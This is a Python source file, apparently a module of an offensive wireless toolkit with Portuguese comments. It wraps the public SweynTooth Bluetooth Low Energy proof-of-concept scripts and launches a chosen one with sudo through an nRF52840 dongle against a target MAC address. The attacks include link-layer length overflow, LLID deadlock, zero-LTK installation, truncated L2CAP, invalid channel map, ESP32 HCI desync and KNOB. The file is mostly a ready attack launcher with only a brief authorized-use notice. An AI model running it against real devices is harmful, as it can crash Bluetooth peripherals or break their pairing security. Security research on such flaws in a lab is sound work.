#!/usr/bin/env python3
# Author: André Henrique (@mrhenrique) | União Geek — https://github.com/Uniao-Geek
"""Bridge subprocess para SweynTooth — PoCs BLE (CVE / link layer) via nRF52840.

Dispara scripts Python do repositório SweynTooth (ex.: overflow de comprimento na
link layer, LLID deadlock, zero LTK, L2CAP truncado, mapa de canal inválido,
desync HCI ESP32, KNOB BLE). Requer dongle Nordic programado com o firmware do
projeto. Não incorpora o código dos PoCs no WirelessXPL.

Version: 1.0.0
"""

from __future__ import annotations

import logging, os, shutil, subprocess, sys
from pathlib import Path
from typing import Dict, List, Optional

from wirelessxpl.core.exploit import *

logger = logging.getLogger(__name__)


class Exploit(Exploit):
    """Subprocess bridge para PoCs SweynTooth (BLE)."""

    __info__ = {
        "name": "SweynTooth Bridge",
        "description": (
            "Execução de PoCs SweynTooth (subprocess): múltiplas CVEs BLE, overflow "
            "de comprimento na link layer, LLID deadlock, zero LTK, L2CAP truncado, "
            "mapa de canal inválido, desync HCI ESP32 e KNOB BLE — via nRF52840."
        ),
        "authors": (
            "André Henrique (@mrhenrike) | União Geek",
            "ASSET / SweynTooth contributors (invoked as subprocess)",
        ),
        "references": (
            "https://github.com/Matheus-Garbelini/sweyntooth_bluetooth_low_energy_attacks",
            "https://asset-group.github.io/disclosures/sweyntooth/",
        ),
        "devices": ("ble", "bluetooth_low_energy"),
    }

    target_address = OptMAC("", "Endereço BLE alvo (ex.: AA:BB:CC:DD:EE:FF)")
    attack = OptString(
        "auto",
        "Ataque: auto | llid_deadlock | link_layer_length | zero_ltk | "
        "truncated_l2cap | invalid_channel_map | esp32_hci_desync | knob",
    )
    serial_port = OptString("", "Porta serial do dongle nRF52840 (ex.: COM7, /dev/ttyACM0)")
    verbose = OptBool(False, "Ambiente verboso (PYTHONUNBUFFERED)")
    dry_run = OptBool(False, "Somente exibir o comando, sem executar")

    # Nomes de script alinhados ao upstream (typo llid_dealock.py mantido).
    _ATTACK_SCRIPTS: Dict[str, str] = {
        "llid_deadlock": "llid_dealock.py",
        "link_layer_length": "link_layer_length_overflow.py",
        "zero_ltk": "Telink_zero_ltk_installation.py",
        "truncated_l2cap": "Microchip_invalid_lcap_fragment.py",
        "invalid_channel_map": "invalid_channel_map.py",
        "esp32_hci_desync": "esp32_hci_desync.py",
        "knob": os.path.join("extras", "knob_tester_ble.py"),
    }

    def _repo_root(self) -> Path:
        """Diretório raiz esperado do clone SweynTooth."""
        return (
            Path(__file__).resolve().parents[5]
            / "submodules"
            / "IoT"
            / "sweyntooth_bluetooth_low_energy_attacks"
        )

    def _resolve_script(self, attack_key: str) -> Optional[Path]:
        """Resolve caminho do script PoC para a chave lógica ``attack_key``."""
        rel = self._ATTACK_SCRIPTS.get(attack_key)
        if not rel:
            return None
        root = self._repo_root()
        candidate = root / rel
        if candidate.is_file():
            return candidate
        return None

    def _build_command(self) -> List[str]:
        """Monta ``python`` + script + serial + MAC alvo.

        Returns:
            Lista de argumentos.

        Raises:
            FileNotFoundError: Repositório ou script ausente.
            ValueError: Parâmetros inválidos ou attack=auto sem escolha.
        """
        port = str(self.serial_port).strip()
        if not port:
            raise ValueError("Defina serial_port do dongle nRF52840.")

        addr = str(self.target_address).strip()
        if not addr:
            raise ValueError("Defina target_address (MAC BLE do periférico).")

        key = str(self.attack).strip().lower().replace("-", "_")
        if key == "auto":
            raise ValueError(
                "attack=auto não executa um PoC. Use dry_run para listar scripts ou "
                "escolha um modo explícito (ex.: link_layer_length)."
            )

        script = self._resolve_script(key)
        if not script:
            root = self._repo_root()
            if not root.is_dir():
                raise FileNotFoundError(
                    "Clone sweyntooth_bluetooth_low_energy_attacks em "
                    "submodules/IoT/sweyntooth_bluetooth_low_energy_attacks."
                )
            raise FileNotFoundError(
                "Script PoC não encontrado para attack='{}' (esperado em {}).".format(
                    key,
                    root,
                )
            )

        py = shutil.which("python3") or sys.executable or "python3"
        return ["sudo", py, str(script), port, addr]

    def run(self) -> None:
        """Executa o PoC SweynTooth selecionado."""
        key = str(self.attack).strip().lower().replace("-", "_")

        if key == "auto":
            if self.dry_run:
                print_info("Ataques mapeados (clone o repositório upstream):")
                for k, rel in sorted(self._ATTACK_SCRIPTS.items()):
                    print_status("  {} → {}".format(k, rel))
                print_info("Defina attack=<chave> e serial_port / target_address.")
            else:
                print_error(
                    "attack=auto: use dry_run para listar PoCs ou defina um attack explícito."
                )
            return

        try:
            cmd = self._build_command()
        except (FileNotFoundError, ValueError) as err:
            print_error(str(err))
            return

        cmd_str = " ".join(cmd)
        if self.dry_run:
            print_info("DRY RUN — comando SweynTooth:")
            print_status(cmd_str)
            return

        print_status("SweynTooth PoC: {} → {}".format(key, Path(cmd[2]).name))
        print_info("Comando: {}".format(cmd_str))
        print_info("Use apenas em equipamento autorizado (pesquisa / lab).")

        env = os.environ.copy()
        if self.verbose:
            env["PYTHONUNBUFFERED"] = "1"

        cwd = Path(cmd[2]).resolve().parent
        try:
            subprocess.run(cmd, check=False, cwd=str(cwd), env=env)
        except KeyboardInterrupt:
            print_info("\nSweynTooth interrompido pelo usuário.")
        except Exception as err:
            print_error("Falha ao executar SweynTooth: {}".format(err))
            logger.exception("sweyntooth subprocess")
